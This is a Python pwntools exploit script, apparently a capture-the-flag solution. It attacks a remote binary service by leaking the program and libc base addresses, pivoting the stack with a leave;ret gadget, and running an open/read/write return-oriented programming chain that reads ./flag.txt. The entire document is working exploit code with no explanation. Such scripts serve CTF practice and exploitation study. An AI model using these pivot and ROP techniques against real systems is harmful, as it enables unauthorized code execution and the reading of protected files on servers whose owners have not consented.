#coding:utf-8
from pwn import *
context.log_level = 'debug'

elf = ELF('./pwn')
libc = ELF("./libc.so.6")
p = remote('172.1.12.5', 9999)
#p = process('./pwn')

p.recvuntil('>')
elf_base = int(p.recvuntil('\n', drop=True), 16) - 0x1387
log.info(hex(elf_base))

target = elf_base + 0x4060
leave = elf_base + 0x1408
pop_rdi_ret = elf_base + 0x0000000000001473
printf_got = elf_base + 0x3FC8
puts_got = elf_base + 0x3FB0
start = elf_base + 0x1120 
main = elf_base + 0x139d
pop_rsi_r15_ret = elf_base + 0x0000000000001471
ret = elf_base + 0x1409

#gdb.attach(p,'b*$rebase(0x13c6)')

payload = p64(pop_rdi_ret) + p64(puts_got) + p64(elf_base + 0x10d0) + p64(elf_base + 0x13c6)
p.sendafter('payload >', 'a'*(0x800-8) + p64(target + 0x820+0x20) + payload)

payload = 'a'*0x20 + p64(target+0x800-8) + p64(leave)
p.sendafter('my stack >', payload)

libc_base = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00') - libc.sym['puts']
log.info(hex(libc_base))

open = libc_base + libc.sym['open']
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
# pop_rdx_rbx_ret = libc_base + 0x00000000001597d6 # 0x00000000001597d6
# pop_rsi_ret = libc_base + 0x000000000002ac3f    # 0x000000000002ac3f
# pop_rax_ret = libc_base + 0x0000000000045580     # 0x0000000000045580
# syscall = libc_base + 0x0000000000108D55

pop_rdx_rbx_ret = libc_base + 0x114161 # 0x00000000001597d6
pop_rsi_ret = libc_base + 0x000000000002ac3f     # 0x000000000002ac3f
pop_rax_ret = libc_base + 0x0000000000045580     # 0x0000000000045580
syscall = libc_base + 0x611ea    
# open("flag.txt", 0)
payload = './flag.txt'.ljust(0x820-8, '\x00') +p64(elf_base+0x1409)
payload += p64(pop_rdi_ret)+p64(target) + p64(pop_rsi_r15_ret)+p64(0)*2 + p64(pop_rax_ret)+p64(2) + p64(syscall)
# read(3, target, 0x50)
payload += p64(pop_rdi_ret)+p64(3) + p64(pop_rsi_r15_ret)+p64(target)*2 + p64(pop_rdx_rbx_ret)+p64(0x50)*2 + p64(pop_rax_ret)+p64(0) + p64(syscall)
# write(1, target, 0x50)
payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rax_ret)+p64(1) + p64(syscall)
p.send(payload)
p.interactive()
